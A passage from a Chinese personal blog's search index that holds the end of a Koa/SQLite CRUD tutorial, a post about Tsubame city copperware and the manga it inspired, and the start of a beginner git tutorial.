class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了解决这个问题，我们需要安装以下依赖库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add -D koa-bodyparser</span><br></pre></td></tr></table></figure><p><code>koa-bodyparser</code> 是一个 koa 框架的中间件，它可以解析 HTTP 请求的正文（body）数据，并将解析后的数据存储在 <code>ctx.request.body</code> 中。它支持解析 JSON、表单和文本类型的正文数据，但不支持解析多部分格式（multipart）数据。也就是说，如果想要实现文件上传，我们还会需要其他的库。</p><p>安装成功后，我们将以下代码添加到 app.js 中，之后我们用于解析 body 的代码就能够正常工作了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;koa-bodyparser&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">bodyParser</span>());</span><br></pre></td></tr></table></figure><h3 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h3><p>假设你的 koa 后端运行在 <a href="http://localhost:3000/">http://localhost:3000</a>，而你的 react 前端运行在 <a href="http://localhost:5173/">http://localhost:5173</a>。如果此时你的前端服务向后端 api 发送请求，会遭到拒绝，提示存在跨域问题：</p><div align='center'>    <img src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230829135418397.png' /></div><p>最简单的解决方法就是在我们的 app.js 中添加一个用于处理跨域资源共享（CORS）的中间件，你可以通过以下指令安装这个库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add -D koa-cors</span><br></pre></td></tr></table></figure><p>安装成功后，将以下代码添加到 app.js 中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;koa-cors&#x27;</span>);</span><br><span class="line">...</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>());</span><br></pre></td></tr></table></figure><h2 id="app"><a href="#app" class="headerlink" title="app"></a>app</h2><p>在解决前面的工作之后，我们开始编写入口文件 app.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;koa-bodyparser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;koa-cors&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">InitManager</span> = <span class="built_in">require</span>(<span class="string">&#x27;./core/init&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Koa</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">bodyParser</span>());</span><br><span class="line"><span class="title class_">InitManager</span>.<span class="title function_">initCore</span>(app);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`🎁 Listening on localhost:3000 ...`</span>);</span><br></pre></td></tr></table></figure><p>完成之后，我们只需要在项目根目录下运行 <code>node app.js</code> 指令，即可启动我们的 koa 后端服务！</p><h2 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h2><p>我们按照以上步骤实现了一套 koa-crud，还需要对其功能进行测试🤧。</p><p>当然，你可以通过访问网页完成对 api 的测试，但这种方法局限性太大，不够灵活且很不方便。好在，现在有很多成熟的🔨工具供我们使用。</p><p>我个人推荐 <code>postman</code>。</p><p>postman 是一款用于测试和开发 API 的合作平台和工具。它提供了一个用户友好的界面，让开发人员能够轻松地发送 HTTP 请求、测试响应并与 API 进行交互</p><p>使用 postman，你可以创建各种类型的 HTTP 请求（例如 GET、POST 和 PUT），设置请求参数（如头部、身体、查询参数等），发送请求，并查看服务器返回的响应。它还提供了断言（assertions）功能，用于验证API的响应是否符合预期。</p><div align='center'>    <img src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230829141158347.png' /></div><p>下载使用都很简单，这里不做介绍，请自行前往 💥<a href="https://www.postman.com/">postman 官网</a> 了解。</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>以上代码就是 <code>kao+sqlite</code> 实现 CRUD 的简单实战，整套代码还有很多可以✨优化的地方。</p><p>比如，调用这个 koa 服务中的 api 都需要使用 POST 请求，不符合目前流行的 <code>RESTful</code> 设计风格，后续可以进行调整（但 POST 一把嗦确实无脑易用🤣）。</p><p>在 controllers 中，我也没有进行适当的错误处理，不方便 DEBUG，也是可以优化的点。</p><p>对传入参数的处理也没有做，我不晓得 koa-bodyparser 有没有进行处理，也可能会存在安全问题。</p><blockquote><p>问题多多❤～摩多摩多❤～</p></blockquote><p>不过呢，这是阿菇第一次用 koa 写后端服务（其实后端都没怎么写过🥲），至少能跑起来了！后续会继续优化这个服务，并更新在 GitHub 仓库中，以上实现的 api 会被规范化为 <code>/api/v1/*</code>，之后优化过的版本会注册为 <code>/api/v2/</code>，这样做可能较符合实际生产环境的写法……</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.koajs.com.cn/#">Koa 中文网</a></li><li><a href="https://chenshenhai.github.io/koa2-note/">Koa2 进阶学习笔记</a></li><li><a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023025933764960">koa - 廖雪峰的官方网站</a></li><li><a href="https://ruanyifeng.com/blog/2017/08/koa.html">Koa 框架教程 - 阮一峰的网络日志</a></li><li><a href="https://juejin.cn/post/7066568536944017438#heading-8">koa 连接sqlite3 项目目录结构 - 稀土掘金</a></li></ul><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>每次写CRUD，都会觉得后端这套东西的逻辑性比前端要强😇，写的时候行云流水。</p><p><code>koa</code> 给我的开发初体验不错，主打一个轻便简洁，仅存储少量数据时配合 <code>sqlite</code> 更是方便。</p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Koa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>燕市、铜器与《铜匠的花嫁》</title>
      <link href="/2023/08/12/2023/bride-of-blackmith/"/>
      <url>/2023/08/12/2023/bride-of-blackmith/</url>
      
        <content type="html"><![CDATA[<div align='center'>    <a href='http://tsubame-shiryoukan.jp/index.html'>    <img src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230825204752292.png' alt='banner' />    </a></div><p>阿菇很喜欢看漫画啦～ 其中有一部日本漫画名为《铜匠的花嫁》，讲得是是一个铜匠与他的女大学生未婚妻的甜蜜故事，算是一个正典的纯爱漫画🥰。</p><p>这个漫画的主题是围绕铜器展开的，男主修出身于铜匠世家，满门心思扑在铜器技术上，青梅竹马的女友决定回家乡做他的经营者，支持他的事业。漫画中穿插了大量对铜器本身的介绍，以及燕市铜器的历史与现状，挺符合日本对工匠精神的颂扬的。</p><p>阿菇本以为铜器只是个噱头，只是为了画纯爱而摘出来的一块垫脚石（恋爱脑对不住了😋）。直到有一天，阿菇发现事情没这么简单……</p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>事情的起因是这样的。阿菇在刷推特的时候看到了一条推文：</p><div align='center'>    <img style='height:500px' src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230825205737275.png' /></div><p>简单翻译一下，就是在 <em><strong>燕工业博物馆</strong></em>  举办了一场与 <a href="https://twitter.com/namo_">@namo</a> 的谈话活动（见面会？），主题是『クプルムの花嫁』，就也是上文中说到的《铜匠的花嫁》。这里的 namo 是这部漫画的原作者，谈话活动现场会展出很多漫画原稿复制品和铜器实物。</p><p>其实阿菇的第一反应很平淡，感觉就是一个漫画家熬出头了，漫画出名了，恭喜恭喜🎉！然后就划过去了。但后来一寻思，不对呀🤔，什么漫画的谈话活动是开在工业博物馆的？然后就想找时间研究研究，看看是为什么。</p><h2 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h2><p>这漫画在国内的热度不高，贴吧也只有二十多个帖子，不能作为参考内容🥲。</p><p>只能动动手自己去查查啦。</p><h3 id="燕市和铜器"><a href="#燕市和铜器" class="headerlink" title="燕市和铜器"></a>燕市和铜器</h3><p>首先是去看的 <a href="http://tsubame-shiryoukan.jp/"><em><strong>燕市産業史料館 的官网</strong></em></a> 。官网首页顶部就是《铜匠的花嫁》的活动宣传🎉，其余的则是一些比较寻常的介绍，博物馆的主题、主要展览物、介绍内容什么的，以及一些基本的地理位置、开馆休馆时间、可体验活动、收费等项目的介绍。</p><p>简单了解一下燕市。</p><p>燕市是一个位于新潟县的城市，以其金属加工技术而闻名。燕市的产业发展始于 1620 年（江户时代初期）开始的“和钉”（日本钉）铸造。燕市产业资料馆是向世界展示燕地区金属加工这一“优质名牌”的史料馆。馆内介绍了始于江户时期并延绵至今的金属加工产业的变迁与传承发展，同时记录了人们精心打造金属加工技术使之成为国际品牌的历程。</p><p>燕市的金属加工技术包括 <strong>🔨鎚起銅器</strong>（锤起铜器）的制作。这是一种源自江户时代的传统工艺，通过锤击铜板来形成立体器物。它被指定为新潟县无形文化财产、文化厅无形文化财产和经济产业大臣传统工艺品。这也是漫画《铜匠的花嫁》中，男主家族的祖传手艺。</p><p>记得好像国内也有这种工艺，之前在纪录片里看到过🤔。</p><p>找资料的过程中，能看待一些铜匠们工作时的图片，和漫画里男主修的姿势如出一辙，再加上对相关知识的了解，感觉 namo 对这个东西应该是详细考察后再画的，细节很足，对铜器的刻画也很逼真：</p><div align='center'>    <img src='https://www.city.tsubame.niigata.jp/section/rocket/img/manufacturing/tsuiki_img3.jpg' alt='燕市のものづくり | 下町ロケット×燕市特設サイト' /></div><div align='center'>    <img src='https://www.city.tsubame.niigata.jp/section/rocket/img/manufacturing/tsuiki_img4.jpg' alt='鎚起銅器（ついきどうき）' /></div><div align='center'>    <img src='https://www.city.tsubame.niigata.jp/section/rocket/img/manufacturing/tsuiki_img2.jpg' alt='鎚起銅器（ついきどうき）' /></div><p>感兴趣的话可以看看下面这些网站，里面对锤起铜器工艺和燕市制造业有更详细的介绍：</p><ul><li><a href="https://kougeihin.jp/craft/0704/">燕锤起铜器</a></li><li><a href="https://www.city.tsubame.niigata.jp/section/rocket/manufacturing/">燕市のものづくり</a></li></ul><h3 id="继续继续"><a href="#继续继续" class="headerlink" title="继续继续"></a>继续继续</h3><p>了解这些肯定不是很够，我还是想知道这个活动本身和漫画的诞生 。</p><p>嘎嘎地翻 namo 的推文，这人是2008年加入的推特，但推文只保留到去年 12月的（不知道是不是我的问题）。</p><p>能翻到 namo 在 2022年12月有过一场艺术展，感觉很帅，很喜欢这种氛围：</p><div style="display:flex" align='center'>    <img style='height:300px' src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230825225231775.png' />    <img style='height:300px' src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230825225501196.png' /></div><p>能翻到最早和燕市官方的联动活动是在 2023年3月，namo 发布了一条<a href="https://twitter.com/namo_/status/1629058560192827393">推文</a>，表示燕市工业博物馆将在接下来的一个月举行《铜匠的花嫁》原稿复制品展会，让大家有机会去游览一下。</p><div align='center'>    <img style='height:400px' src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230825225852725.png' /></div><p>之后就没什么很特别的内容了，举办了一次之后可能看效果不错，又连续举办了两场，包括引起我兴趣的那条宣传用的推文。</p><p>在这个过程中，我还翻到了 <em><strong>新潟県燕市官方推特</strong></em> 对 namo 手写签名板（呜呜呜，我也想要😍）的感谢推文，感觉日本那块对这样的宣传活动还是蛮重视的。这里截张签名版展示一下：</p><div align='center'>    <img style='height:400px' src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230825231009207.png' /></div><h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>总的来说，namo 创作这部漫画可能只是在燕市进行了取材，本身并没有和燕市那边有过沟通。后来🔥热度起来了，燕市那边看这漫画可能比较适合宣传当地产业，就联系了作者举办了联合画展，收效不错后就连着举行了几场。</p><p>互惠共利，好事。阿菇在翻推文的时候，也确实看到了许多人因为受到《铜匠与花嫁》漫画影响去了燕市产业资料馆进行了参观，也有因为发现资料馆中举办画展而去看漫画的，双赢嘛🎉！</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>翻的主要是推文啦，链接都贴在探究部分，就不往这里放了。下面的主要是一些翻找过程中浏览过的的链接。</p><ul><li><a href="http://tsubame-shiryoukan.jp/shinkan_ctjp.html">燕市産業史料館</a></li><li><a href="https://www.city.tsubame.niigata.jp/section/rocket/manufacturing/">燕市制造业</a></li><li><a href="https://bangumi.tv/subject/336906">クプルムの花嫁</a></li><li><a href="https://bangumi.tv/person/18209">namo</a></li><li><a href="https://www.tumblr.com/namobani?redirect_to=/namobani&source=content_warning_wall">namo tumblr</a></li></ul><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>好啦，先说这么多吧，其实也没有研究的很透，就翻了翻推文满足了一下好奇心，大致推测了一下画展的原委，不保真😝～</p><p>《铜匠的花嫁》本身也入围了「人氣漫畫大賞 2023」得奖作品名单，不知道能取得什么样的成绩（讲道理我对这东西的含金量也不清楚🫠），预祝它取得好成绩吧🎊！</p><div align='center'>    <img src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230825215146742.png' alt='2023game' /></div><p>对这个漫画感兴趣的可以来啃啃🥩生肉，是上乘的狗粮哦！</p><blockquote><p><a href="https://seiga.nicovideo.jp/comic/51380?track=tsugimanga">クプルムの花嫁</a></p><p>寡黙な職人と天真爛漫なギャルのイチャラブ婚約生活！</p></blockquote><p>最后，再来看一眼可爱的女主——稚名！</p><div align='center'>    <img src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230825214556552.png' alt='footer' /></div>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git基础教程</title>
      <link href="/2023/06/08/2023/base-git/"/>
      <url>/2023/06/08/2023/base-git/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://git-scm.com/doc">git官方文档</a>👈有问题建议先看文档，二手资料有时会存在奇奇怪怪的问题。</p></blockquote><p>emmm，其实是想写一篇<strong>使用<code>hexo</code>快速搭建个人博客</strong>的教程，但感觉在那篇教程里穿插着讲<code>git</code>的话，很多初学者可能搞不清楚<code>git</code>到底是什么，甚至可能会把<code>git</code>和<code>hexo</code>的概念绑定起来，那样就比较麻烦了。所以就决定先写一篇文章介绍<code>git</code>（去年学得时候没写，正好也是补充一下）。</p><h2 id="git相关概念"><a href="#git相关概念" class="headerlink" title="git相关概念"></a>git相关概念</h2><p>到底什么是<code>git</code>呢？用一句话来说，<code>git</code>是一种<strong>分布式版本控制系统</strong>。暂时看不懂也没关系，接下来会详细说所谓的“分布式版本控制系统”是什么。</p><h3 id="版本控制系统"><a href="#版本控制系统" class="headerlink" title="版本控制系统"></a>版本控制系统</h3><p>先说说版本控制系统是个啥。</p><p>为了方便理解，在这里举一个常见的案例来进行解释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">你需要和舍友共同完成一篇3000字的论文，你写A部分，舍友写B部分。</span><br><span class="line">初步完成A部分内容后，你通过QQ等软件将文本文件发送给舍友，让他继续写B部分，而同时你也在你的电脑上接着完善A部分。</span><br><span class="line">当舍友完成B部分后，他又将文本文件发送给你，然后，你需要将A部分改动的内容与舍友的B部分合并，找出哪些地方发生了变化，这就有点麻烦了。</span><br><span class="line">写完论文之后，你和舍友聚在一块，进一步完善论文。你发现，你的猪头舍友在写B部分时误删了一些A的内容，而你在合并时没有注意，导致这部分内容你和舍友都没有备份，无奈之下你们只好重写了这块丢失的内容。</span><br><span class="line">再次完善论文时，你们发现，在编写的过程中论文B部分的立意跑偏了，你们需要重写B部分。但现在AB混在了一起，很难把论文恢复到原先的状态。</span><br><span class="line">在崩溃的边缘，你有可能会想，有没有一款软件，能够自动记录对文件的每次修改，同时还可以与别的成员协同编辑，这样就不需要来回发送文件，也不需要反复另存文件以保证留有文档的备份？</span><br></pre></td></tr></table></figure><p>这种时候，就到我们的主角出场的时候了，它就是今天的主角：</p><p><del>在线共享文档</del> 版本控制系统！</p><p>版本控制系统（Version Control System，VCS）就可以完成上述的工作，它可以自动跟踪文件的变化、还原文件的历史记录、协调多人在同一个项目中工作，宾且可以在必要情况下回溯到过去的任意版本。</p><p>在软件开发中，版本控制系统可以帮助开发人员有效地管理和维护代码库，支持项目的分支、合并等操作。这样，在多人协作开发的情况下，不同的成员可以同时对同一个项目进行开发，而不会产生代码冲突等问题。此外，版本控制系统还可以提供更好的安全备份和恢复机制，以防止意外的数据丢失或代码损坏！</p><p>常见的版本控制系统有<code>Subversion</code>、<code>Mercurial</code>，当然，还有我们的主角——<code>git</code>！</p><h3 id="分布式-集中式"><a href="#分布式-集中式" class="headerlink" title="分布式 &amp; 集中式"></a>分布式 &amp; 集中式</h3><p>再说说什么是分布式，以及与分布式对应的集中式。</p><p>在版本控制系统中，<strong>分布式</strong>是指每个开发者都有完整的<strong>代码库副本</strong>，并且可以在本地进行修改、提交和推送等操作。</p><p>相比之下，<strong>集中式</strong>版本控制系统（例如<code>SVN</code>）依赖于一个<strong>中央代码库</strong>。开发者从中央代码库检出代码副本，然后在本地进行修改，修改后，他们<strong>必须</strong>将更改推送回中央代码库，否则其他开发者无法获得最新版本的代码。</p><p>二者的区别在于，在分布式系统中，每个开发者都有完整的代码库副本，可以在本地进行修改、提交和推送等操作；而在集中式系统中，开发者只能从中央代码库检出代码，并且必须将更改推送回中央代码库。这就意味着，在分布式系统中，开发者可以在没有网络连接的情况下继续工作，不需要频繁地与中央服务器进行通信，同时，每个开发者都能拥有完整的历史记录，方便历史回溯等操作。</p><h2 id="git安装配置"><a href="#git安装配置" class="headerlink" title="git安装配置"></a>git安装配置</h2><p>阿菇的系统是<code>Fedora 37</code>，如有差异请自行解决。在终端执行以下命令安装<code>git</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Fedora用户使用这句</span></span><br><span class="line"><span class="built_in">sudo</span> dnf install git</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu用户使用这句</span></span><br><span class="line"><span class="built_in">sudo</span> apt install git</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>我们可以通过修改<code>git</code>配置来定制<code>git</code>环境。首先需要设置用户名和邮箱地址，我们之后的每一次<code>git</code>提交都会包含这些信息。使用以下指令全局设置<code>username</code>和<code>email</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将&quot;your-username&quot;和&quot;your-email-address&quot;替换为你的用户名和邮箱地址</span></span><br><span class="line"><span class="comment"># 建议设置为你的github账户的用户名和绑定的邮箱地址</span></span><br><span class="line">git config --global user.name  <span class="string">&quot;your-usernmae&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;your-email-address&quot;</span></span><br></pre></td></tr></table></figure><p>你还可以使用以下指令检查你的<code>git</code>配置信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure><p>使用以下指令查看当前系统所有的<code>git</code>配置文件及其位置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list --show-origin</span><br></pre></td></tr></table></figure><p>进一步的配置，如设置默认的文本编辑器、搭建git服务器等，可以参考官方文档，这里不过多介绍。</p><h2 id="本地创建git仓库"><a href="#本地创建git仓库" class="headerlink" title="本地创建git仓库"></a>本地创建git仓库</h2><p>仓库，可以简单的理解成一个目录，这个目录里的文件和资源都可以通过git进行管理。</p><p>使用以下指令初始化一个本地的git仓库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 your-repo-name 替换为你的git仓库的名称</span></span><br><span class="line">git init your-repo-name</span><br></pre></td></tr></table></figure><p>使用这句指令后，会有输出提醒，你新建了一个空的Git仓库。转进到这个目录，你会发现这个目录下其实已经包括了一个隐藏目录<code>.git</code>，这里面存储的是一些版本信息，用于跟踪管理文件信息，平常不去碰它就好了。</p><h2 id="git分区"><a href="#git分区" class="headerlink" title="git分区"></a>git分区</h2><p>此部分讲解<code>git</code>的三个工作分区是怎么工作的，也就是<code>git</code>到底是如何对我们的项目进行版本控制的。</p><h3 id="三个分区"><a href="#三个分区" class="headerlink" title="三个分区"></a>三个分区</h3><p>一个完整的本地<code>git</code>工作目录包括三个分区，工作区、暂存区和版本库。</p><ul><li><strong>工作区</strong>：指的是当前目录下除<code>.git</code>目录外的区域，用户可以随意修改工作区文件的内容。</li><li><strong>暂存区</strong>：指的是<code>.git</code>目录下的<code>index</code>文件，该文件包含了当前工作树中所有被添加到版本控制中的文件列表和它们的元数据，如文件名、文件类型、文件大小、最后修改时间等信息。</li><li><strong>版本库</strong>：指的是存储代码版本历史记录的地方，也就是代码仓库。git的版本库包含了所有commit的snapshot和message，以及所有branch、tag等元数据信息。通常情况下，一个项目只有一个版本库，它可以存储在本地或者远程服务器上，开发者可以通过命令行或者图形界面工具来管理和操作版本库。</li></ul><p>以上三个分区中，暂存区和版本库可以合称为<strong>git仓库</strong>。</p><p>看到这里，你可能会有些疑惑，我们刚才使用<code>init</code>指令不是创建了一个git仓库吗，为什么这里又说<strong>暂存区和版本库可以合称git仓库</strong>，工作区去哪里了？</p><p>我们刚才使用<code>git init</code>指令，<strong>本质上是创建了一个空的项目目录，这个项目目录下自动包含了一个<code>.git</code>目录</strong>（也就是<code>git</code>仓库），方便我们对这个项目目录进行版本管理，刚才所说的暂存区和版本库，实际上都位于<code>.git</code>隐藏目录下。出于习惯，我们一般会把整个项目目录叫做一个<code>git仓库</code>，也可以叫做<strong>本地仓库</strong>，与接下来会讲到的<strong>远程仓库</strong>相对应。</p><h3 id="在分区之间操纵文件"><a href="#在分区之间操纵文件" class="headerlink" title="在分区之间操纵文件"></a>在分区之间操纵文件</h3><p>这张图可以清晰的看到三个分区之间的关系，以及我们应该如何使用<code>git</code>来操作我们的文件。</p><p><img src="https://img.ma5hr00m.top/blog/20231216105917.png" alt="git三个分区之间的关系"></p><p>在具体讲解如何在不同分区之间操纵文件之前，先说一下如何查看某个文件的状态。我们可以使用以下指令查看当前git目录中某个文件的具体状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p>在这个指令的输出中，一个文件存在以下三种状态：</p><ul><li>不显示：表明该<strong>文件没有发生改动</strong>，改动是指该文件在工作区和在版本库中的内容不同，新建、删除文件均属于改动；</li><li>红色文件：表示<strong>文件已发生改动，且没有添加到暂存区中</strong>；</li><li>绿色文件：表明<strong>文件已发生改动，且已经添加到暂存区中</strong>。</li></ul><p>具体的指令就不细说了，直接在底下罗列出来，需要时拿过来用就行，很容易就能看懂。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 工作区 -&gt; 暂存区</span></span><br><span class="line">git add filename</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂存区 -&gt; 版本库</span></span><br><span class="line">git commit -m <span class="string">&quot;message&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 前两句指令的合体，同时实现前两句指令的功能</span></span><br><span class="line">git commit -am <span class="string">&quot;message&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 缓存区 -&gt; 工作区</span></span><br><span class="line">git <span class="built_in">rm</span> --cached filename</span><br><span class="line">git <span class="built_in">rm</span> --staged filename</span><br><span class="line">git reset HEAD filename</span><br><span class="line"></span><br><span class="line"><span class="comment"># 撤销当前工作区所有改动，包括文件删除和创建操作</span></span><br><span class="line">git checkout -- filename</span><br><span class="line">git restore filename</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
